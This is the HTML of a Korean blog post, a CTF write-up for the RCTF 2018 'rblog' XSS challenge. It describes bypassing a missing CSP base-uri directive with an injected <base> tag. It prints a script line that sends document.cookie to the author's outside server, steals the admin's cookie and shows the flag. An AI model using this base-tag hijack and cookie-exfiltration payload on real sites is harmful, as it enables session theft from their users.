@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[RCTF2018] rblog Write up | mingzzi</title>
+	<meta name="description" content="rblog는 RCTF 2018에 출제되었던 XSS 문제인데, 대회 기간에는 풀이하지 못했다가 Write-up이 올라온 후 풀어보게 되었다.문제 정보는 아래와 같다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/ctf/2018/2018/05/27/ctf-rctf2018-rblog.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[RCTF2018] rblog Write up</h1>
+    
+    <p class="meta">
+      May 27, 2018
+      
+    </p>
+  </header>
+  <section class="post-content"><p><code class="highlighter-rouge">rblog</code>는 <code class="highlighter-rouge">RCTF 2018</code>에 출제되었던 XSS 문제인데, 대회 기간에는 풀이하지 못했다가 Write-up이 올라온 후 풀어보게 되었다.</p>
+
+<p>문제 정보는 아래와 같다.</p>
+
+<!--more-->
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get `document.cookie`
+http://rblog.2018.teamrois.cn
+</code></pre></div></div>
+
+<h3 id="1-문제-분석">1. 문제 분석</h3>
+
+<p>문제 링크에 접속하면 아래와 같은 페이지를 확인할 수 있다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_01.PNG" alt="" /></p>
+
+<p>제목과 내용을 적고, 스타일을 적용하거나 이미지를 업로드할 수 있는 기능이 있다.</p>
+
+<p>또한 <code class="highlighter-rouge">최신 버전의 Chrome을 사용중인 admin</code>에게 신고할 수도 있다.</p>
+
+<p>admin에게 신고할 때에는 특정 값을 입력해야 하는데, 이는 내가 업로드 한 블로그의 주소라는 것을 알 수 있다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_02.PNG" alt="" /></p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_03.PNG" alt="" /></p>
+
+<h3 id="2-취약점-찾기">2. 취약점 찾기</h3>
+
+<p>문제의 설명에서 <code class="highlighter-rouge">document.cookie</code>를 얻으라고 했으므로 <code class="highlighter-rouge">XSS</code> 문제인 것은 알 수 있다.</p>
+
+<p>때문에 어떤 부분에서 <code class="highlighter-rouge">XSS</code>가 가능한지 알기 위해 <code class="highlighter-rouge">title</code>, <code class="highlighter-rouge">content</code>, <code class="highlighter-rouge">style</code>을 적용하는 부분에 아래와 같이 script 코드를 삽입 해 보았다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_04.PNG" alt="" /></p>
+
+<p>그 결과, <code class="highlighter-rouge">title</code> 부분에서 <code class="highlighter-rouge">script</code>가 정상적으로 삽입되는 것을 확인할 수 있었지만, 실행되지는 않았다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_05.PNG" alt="" /></p>
+
+<p>이 문제에도 역시나 <code class="highlighter-rouge">CSP</code>가 걸려있었다.</p>
+
+<p><code class="highlighter-rouge">XSS</code> 공격은 해야하는데, <code class="highlighter-rouge">CSP</code>가 걸려 있어서 어떻게 풀이해야 하나 싶었는데, 다른 사람들의 write-up을 보니 <code class="highlighter-rouge">Google</code>에서 만든 <a href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a>를 통해 특정 사이트에 적용 된 CSP 정보를 확인할 수 있었다.</p>
+
+<p>문제의 URL을 넣고 확인 해 보니 <code class="highlighter-rouge">base-uri</code>에 대한 보호가 적용되어 있지 않았다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_06.PNG" alt="" /></p>
+
+<p>즉, <code class="highlighter-rouge">&lt;base&gt;</code>라는 태그를 사용하여 소스코드 상에서 사용된 상대 경로의 기준이 될 경로를 지정할 수 있다.</p>
+
+<p>만약 소스코드에서 css 파일이나 js 파일 등을 참조할 때 <code class="highlighter-rouge">./css/style.css</code>라는 상대 경로가 있을 경우, <code class="highlighter-rouge">&lt;base&gt;</code> 태그를 이용해 따로 경로를 설정해 주지 않는 한 <code class="highlighter-rouge">현재 페이지의 경로를 기준</code>으로 <code class="highlighter-rouge">style.css</code>를 찾아간다.</p>
+
+<p>그런데 만약 <code class="highlighter-rouge">&lt;base&gt;</code> 태그를 이용 해 <code class="highlighter-rouge">&lt;base href="http://www.test.com/"&gt;</code>와 같이 기준 경로를 바꾸어 줄 경우, <code class="highlighter-rouge">설정해 준 경로를 기준</code>으로 파일을 찾아가게 된다.</p>
+
+<p>따라서 <code class="highlighter-rouge">&lt;base&gt;</code> 태그를 이용 해 기준 경로를 바꾸어 준다면, 문제의 소스코드 내에서 사용하는 <code class="highlighter-rouge">js</code>나 <code class="highlighter-rouge">css</code>를 내가 원하는 파일로 바꾸어 실행시킬 수 있다.</p>
+
+<p>우리는 <code class="highlighter-rouge">document.cookie</code>를 얻어야 하므로, <code class="highlighter-rouge">js</code> 파일을 사용하는 부분을 찾아보았다.</p>
+
+<p>다시 소스코드를 살펴보니 내가 업로드 한 블로그 글의 하단에서 아래와 같이 <code class="highlighter-rouge">js</code> 파일을 실행시키는 것을 확인할 수 있었다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_07.PNG" alt="" /></p>
+
+<p>따라서 <code class="highlighter-rouge">&lt;base&gt;</code> 태그를 이용 해 기준 경로를 바꾸어 준 후, 바꾼 경로에 <code class="highlighter-rouge">/assets/js/jquery.min.js</code> 파일을 만든다면, 내가 원하는 코드를 실행시킬 수 있게 된다.</p>
+
+<h3 id="3-문제-풀이">3. 문제 풀이</h3>
+
+<p>나는 내 서버와 도메인을 갖고 있기 때문에 내 서버를 사용했다.</p>
+
+<p>내 서버에 <code class="highlighter-rouge">/assets/js/</code> 디렉토리 아래에 <code class="highlighter-rouge">jquery.min.js</code> 파일을 생성한 후, 아래와 같이 소스코드를 구현하였다.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">"http://ccoma.me/?"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>이 후 <code class="highlighter-rouge">title</code>에 <code class="highlighter-rouge">&lt;base href="http://ccoma.me/"/&gt;</code> 를 넣어 글을 올린다면 기준 경로가 내 도메인이 되어 <code class="highlighter-rouge">&lt;script nonce="af8d8b049007ffdddf9d4104295d126e" src="/assets/js/jquery.min.js"&gt;&lt;/script&gt;</code>는 실제로는 <code class="highlighter-rouge">http://ccoma.me/assets/js/jquery.min/js</code>를 실행하게 된다.</p>
+
+<p>이 때, 해당 경로에는 <code class="highlighter-rouge">location.href = "http://ccoma.me/?" + document.cookie;</code>가 있으므로 <code class="highlighter-rouge">document.cookie</code>의 값을 인자로 해 해당 도메인에 접근하게 될 것이다.</p>
+
+<p>글을 업로드 한 후에 해당 글의 경로를 <code class="highlighter-rouge">admin</code>에게 신고하면 <code class="highlighter-rouge">admin</code>이 해당 글에 접근할 것이며, 결론적으로 <code class="highlighter-rouge">admin</code>의 <code class="highlighter-rouge">cookie</code>를 인자로 해당 도메인에 다시 접근하게 된다.</p>
+
+<p>먼저 아래와 같이 글을 올려 보았다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_08.PNG" alt="" /></p>
+
+<p><code class="highlighter-rouge">jquery.min.js</code>에는 <code class="highlighter-rouge">location.href</code>가 구현되어 있기 때문에 내 서버로 리다이렉트 될 것이다.</p>
+
+<p>때문에 <code class="highlighter-rouge">burp suite</code>를 이용 해 <code class="highlighter-rouge">Response</code>를 잡아 블로그 글의 주소를 캡쳐 했다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_09.PNG" alt="" /></p>
+
+<p>이 후 해당 글의 링크를 <code class="highlighter-rouge">admin</code>에게 보내주었다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_10.PNG" alt="" /></p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_11.PNG" alt="" /></p>
+
+<p>그러면 <code class="highlighter-rouge">admin</code>이 내 서버로 접근하게 되는데, 이 때 GET 방식으로 cookie가 넘어오게 되므로 이를 확인하기 위해 <code class="highlighter-rouge">access.log</code>를 확인 해 보았다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tail -f /var/log/apache2/access.log
+</code></pre></div></div>
+
+<p>전송 후에 짧게는 몇 초, 길게는 2분 정도를 기다리면 아래와 같이 flag가 함께 전송된 것을 확인할 수 있다.</p>
+
+<p><img src="/images/CTF/RCTF2018/rblog/rblog_12.PNG" alt="" /></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FLAG : RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}
+</code></pre></div></div>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#CTF">#CTF</a>
+    
+    <a class="tag" href="/tags#RCTF2018">#RCTF2018</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/ctf/2018/2018/05/27/ctf-rctf2018-rblog.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/ctf/2018/2018/05/23/ctf-rctf2018-amp.html">
+        [RCTF2018] amp Write up
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/pwnable.kr/2018/05/29/pwnable.kr-random.html">
+        [Pwnable.kr] Toddler's Bottle - random 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
